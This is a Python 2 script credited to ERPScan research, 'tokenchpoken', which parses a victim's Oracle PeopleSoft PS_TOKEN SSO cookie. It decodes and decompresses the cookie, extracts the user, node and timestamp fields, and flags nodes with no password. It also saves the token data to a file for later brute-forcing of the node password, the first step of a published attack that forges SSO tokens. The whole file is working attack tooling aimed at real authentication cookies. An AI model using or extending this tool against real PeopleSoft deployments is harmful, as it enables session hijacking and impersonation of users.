#!/usr/bin/python
import string
import base64
import hashlib
import zlib
import argparse

"""
Credit: erpscan
https://erpscan.com/press-center/blog/peoplesoft-security-part-3-peoplesoft-sso-tokenchpoken-attack/
"""

print
print 'tokenchpoken v0.5 beta'
print 'Oracle PS_TOKEN cracker. Token parser'
print
print 'Alexey Tyurin - a.tyurin at erpscan.com'
print 'ERPScan Research Group - http://www.erpscan.com'
print
parser = argparse.ArgumentParser()
parser.add_argument('-c', action='store', dest='cookie', required=True, help='Set a victim\'s PS_TOKEN cookie for parsing')
parser.add_argument('-f', action='store', dest='filename', default="salt.txt", help='Set a file name for storing data for next bruteforcing')
parser.add_argument('-v', action='store', dest='verbose', default=False, help='Be more verbose and show the token\'s headers')

args = parser.parse_args()

input=args.cookie

full_str=base64.b64decode(input)


if args.verbose:
    #header possible
    print "possible the header"
    print full_str[0:4].encode('hex')+" - full length"
    print hex(len(full_str))+" real length"
    print full_str[4:8].encode('hex')+" - magic number - - little/big endian"
    print full_str[8:12].encode('hex')+" - static"
    print full_str[12:16].encode('hex')+" - static"
    print full_str[16:20].encode('hex')+" - static"

    print
    print "possible the hash"
    print full_str[20:24].encode('hex')+" - full hash length"
    print hex(len(full_str[20:64])) , " - real hash length"
    print full_str[24:26].encode('hex')+" - str size"
    print full_str[26].encode('hex')+" - S"
    #print full_str[26] , " - full hash length?"
    print full_str[27:30].encode('hex')+" - hdr"
    print full_str[30:31].encode('hex')+" - str size"
    print full_str[31:33].encode('hex')+" - unknown"
    print full_str[33:34].encode('hex')+" - decompressed token length"
    print full_str[34:35].encode('hex')+" - str size"
    print full_str[35:43].encode('hex')+ " " +  full_str[35:44] ," - version? (static)"
    print full_str[43].encode('hex')+" - hash length"
    print full_str[44:64].encode('hex')+" - SHA-1"
    print
    print "possible the body"
    print full_str[64:68].encode('hex')+" - full body length"
    print hex(len(full_str[64:]))+" real body length"
    print len(full_str[64:])
    print full_str[68:70].encode('hex')+" - str size"
    print full_str[70].encode('hex')+" - S"
    #print full_str[26] , " - full hash length?"
    print full_str[71:75].encode('hex')+" - hdr"
    print full_str[75].encode('hex')+" - full data length"
    print hex(len(full_str[76:]))+" real body length"
    print full_str[76:] +" - data"


sha_mac=full_str[44:64].encode('hex')
inflate_data=full_str[76:]
data=zlib.decompress( inflate_data )

#parsing of compressed data
data_hash=hashlib.sha1(data).hexdigest()

if args.verbose:
    print data +" - compressed data"
    print data.encode("hex")+" - hex encoded compressed data"
    print data_hash +" - SHA-1 for compressed data"
#dataUTF= data1.encode('utf_16_le')

print
print "SHA-1 hash from the token: "+sha_mac
print
print "Information from the token: "
if args.verbose:
    print data[0:4].encode('hex')+ " - full length"
    print hex(len(data))+" real length"
    print data[4:8].encode('hex')+" - magic number - - little/big endian"
    print data[8:12].encode('hex')+" - static number"
    print data[12:16].encode('hex')+" - static number"
    print data[16:20].encode('hex')+" - static number"


if (data[4:8].encode('hex') == '04030201'):
    print "Little endian"
else:
    print "Big endian"
user_length=data[20]
#print user_length.encode('hex')+" - user name length "
loc=21
print data[loc:loc+int(user_length.encode('hex'), 16)].replace("\x00","")+" - user name "
loc=loc+int(user_length.encode('hex'), 16)
lang_length=data[loc]
#print lang_length.encode('hex')+" - Lang length"
loc=loc+1

print data[loc:loc+int(lang_length.encode('hex'), 16)].replace("\x00","")+" - lang code "
loc=loc+int(lang_length.encode('hex'), 16)
node_length=data[loc]
#print node_length.encode('hex')+" - node name length"
loc=loc+1

print data[loc:loc+int(node_length.encode('hex'), 16)].replace("\x00","")+" - node name"
loc=loc+int(node_length.encode('hex'), 16)
time_length=data[loc]
#print time_length.encode('hex')+" - time length"
loc=loc+1
print data[loc:loc+int(time_length.encode('hex'), 16)].replace("\x00","")+" - creation time"


#good_data=data[20:]
# while len(good_data)>1:
#     i=0
#     part_length=int(good_data[i].encode('hex'), 16)
#     part=good_data[i+1:i+part_length].split('\x00')
#     print ''.join(part)
#     good_data=good_data[i+part_length+1:]
#

if data_hash == sha_mac:
    print
    print "A hash from the header and a hash for the compressed data is equal"
    print "There is no password for the attacking node"



#print data.encode('hex')

with open(args.filename,"w") as f:
    try:
        f.write(data)
        print "%s is saved" % args.filename
        f.close()
    except :
        print "Coudn't open a file ", args.filename
        exit()
